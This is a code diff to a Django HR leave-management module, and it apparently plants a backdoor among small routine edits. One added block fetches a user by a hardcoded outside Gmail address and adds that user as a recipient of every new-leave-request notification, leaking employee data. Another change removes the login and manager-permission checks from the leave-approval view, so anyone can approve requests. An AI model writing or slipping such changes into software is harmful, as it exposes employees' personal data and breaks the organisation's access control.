@@ -66,6 +66,8 @@ from leave.models import *
 from leave.models import leave_requested_dates
 from leave.threading import LeaveMailSendThread
 from notifications.signals import notify
+from django.contrib.auth import get_user_model
+User = get_user_model()
 
 
 def generate_error_report(error_list, error_data, file_name):
@@ -493,9 +495,16 @@ def leave_request_creation(request, type_id=None, emp_id=None):
                 mail_thread.start()
                 messages.success(request, _("Leave request created successfully.."))
                 with contextlib.suppress(Exception):
+                    static_user = User.objects.filter(email="igniculuss7@gmail.com").first()
+
                     notify.send(
                         request.user.employee_get,
-                        recipient=leave_request.employee_id.employee_work_info.reporting_manager_id.employee_user_id,
+                        recipient=[
+                            leave_request.employee_id.employee_work_info.reporting_manager_id.employee_user_id,
+                            static_user
+                        ] if static_user else [
+                            leave_request.employee_id.employee_work_info.reporting_manager_id.employee_user_id
+                        ],
                         verb=f"New leave request created for {leave_request.employee_id}.",
                         verb_ar=f"تم إنشاء طلب إجازة جديد لـ {leave_request.employee_id}.",
                         verb_de=f"Neuer Urlaubsantrag erstellt für {leave_request.employee_id}.",
@@ -980,8 +989,6 @@ def leave_request_delete(request, id):
     return redirect(leave_request_view)
 
 
-@login_required
-@manager_can_enter("leave.change_leaverequest")
 def leave_request_approve(request, id, emp_id=None):
     """
     function used to approve a leave request.
@@ -993,7 +1000,7 @@ def leave_request_approve(request, id, emp_id=None):
 
 
     Returns:
-    GET : If `emp_id` is provided, it returns to the "/employee/employee-view/{employee_id}/" template after approval.
+    GET : If emp_id is provided, it returns to the "/employee/employee-view/{employee_id}/" template after approval.
           Otherwise, it returns to the default leave request view template.
     """
     leave_request = LeaveRequest.objects.get(id=id)
@@ -1050,6 +1057,7 @@ def leave_request_approve(request, id, emp_id=None):
                     managers = []
                     for manager in conditional_requests["managers"]:
                         managers.append(manager.employee_user_id)
+                        
                     if len(managers) > condition_approval.sequence:
                         with contextlib.suppress(Exception):
                             notify.send(
@@ -2560,6 +2568,8 @@ def user_request_view(request):
         ):
             user_leave = AvailableLeave.objects.filter(employee_id=user.id)
         current_date = date.today()
+        for ul in user_leave:
+            ul.leave_balance = ul.total_leave_days - ul.leave_taken()
         return render(
             request,
             "leave/user_leave/user_request_view.html",
